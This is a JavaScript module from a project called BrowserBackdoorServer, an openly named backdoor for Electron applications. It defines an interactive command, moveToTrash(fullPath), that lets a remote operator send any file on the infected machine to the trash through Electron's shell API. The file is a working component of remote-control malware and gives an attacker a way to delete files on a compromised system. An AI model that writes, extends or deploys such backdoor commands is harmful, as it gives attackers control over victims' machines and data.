// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Moves a file to the trash
 * Parameters: fullPath
 * Returns: undefined
 * Author: IMcPwn
 */

if (typeof electron == 'undefined') electron = require('electron');
if (typeof shell == 'undefined') shell = electron.shell;

moveToTrash = function (fullPath) {
    shell.moveItemToTrash(fullPath);
}

return "Usage: moveToTrash(fullPath)";
